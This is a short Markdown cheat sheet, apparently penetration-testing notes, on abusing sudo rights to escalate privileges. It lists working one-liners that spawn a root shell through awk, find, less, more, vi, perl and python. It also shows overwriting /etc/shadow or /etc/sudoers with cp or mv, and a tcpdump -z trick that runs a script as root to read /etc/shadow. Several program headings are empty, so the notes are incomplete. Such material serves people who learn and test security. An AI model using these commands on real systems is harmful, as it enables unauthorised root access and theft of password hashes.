# Abusing Sudo Rights

## Overview

* if you have a limited shell that has access to some programs using sudo you might be able to

escalate your privileges with

* any program that can write or overwrite can be used
* for example, if you have sudo-rights to cp you can

```bash
overwrite /etc/shadow #or 
/etc/sudoers #with your own malicious file
```

## Awk

```bash
awk 'BEGIN {system("/bin/bash")}'
```

## Bash

## Cp

* copy and overwrite this file

```bash
/etc/shadow
```

## Find

```bash
sudo find / -exec bash -i \;
```

```bash
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
```

## Ht

* the text/binary-editor HT.

## Less

* from less you can go into vi, and then into a shell

```bash
sudo less /etc/shadow
v
:shell
```

## More

* you need to run more on a file that is bigger than your screen

```bash
sudo more /home/pelle/myfile
!/bin/bash
```

## Mv

* overwrite these files

```bash
/etc/shadow
/etc/sudoers
```

## Man

## nano

## Nc

## Nmap

## Python/Perl/Ruby/Lua/Etc

### Perl

```bash
sudo perl
exec "/bin/bash";
ctr-d
```

### Python

```bash
sudo python
import os
os.system("/bin/bash")
```

## Sh

## tcpdump

```bash
echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

## Vi/Vim

* can be abused like this

```bash
sudo vi
:shell
#and/or
:set shell=/bin/bash:shell
:!bash
```
